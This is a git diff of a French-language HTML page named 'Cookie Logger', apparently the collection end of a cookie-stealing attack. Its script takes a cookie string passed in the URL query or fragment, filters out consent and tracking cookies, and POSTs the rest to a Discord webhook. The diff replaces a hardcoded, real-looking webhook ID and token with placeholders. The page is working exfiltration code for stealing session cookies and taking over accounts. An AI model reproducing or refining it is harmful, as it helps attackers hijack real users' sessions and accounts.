@@ -1,20 +1,36 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8" />
-  <title>Cookies grabbed</title>
+  <meta charset="UTF-8">
+  <title>Cookie Logger</title>
 </head>
 <body>
   <script>
-
     const urlParams = new URLSearchParams(window.location.search);
     const hashParams = new URLSearchParams(window.location.hash.substring(1));
-    const cookie = urlParams.get('cookie') || hashParams.get('cookie') || '[No cookie]';
+    const rawCookie = urlParams.get('cookie') || hashParams.get('cookie') || '[No cookie]';
 
-    fetch('https://discord.com/api/webhooks/1399087360490082378/x11chNJFs2z93FEqBEMoSqX0Pmh1ZoX9bbv1eTLq6R8AMyKbhSdKHKVIlkBIaDf7RDnT', {
+    const cookiesToIgnore = [
+      '_tracking_consent',
+      'CONSENT',
+      'eu_cn',
+      'twtr_pixel_opt_in',
+      'd_prefs'
+    ];
+
+    const filtered = rawCookie
+      .split(';')
+      .map(c => c.trim())
+      .filter(c => {
+        const name = c.split('=')[0];
+        return !cookiesToIgnore.includes(name);
+      })
+      .join('; ');
+
+    fetch('https://discord.com/api/webhooks/TON_ID/TON_TOKEN', {
       method: 'POST',
       headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({content: `Cookie : ${cookie}`})
+      body: JSON.stringify({content: `Cookies : ${filtered}`})
     });
   </script>
 </body>
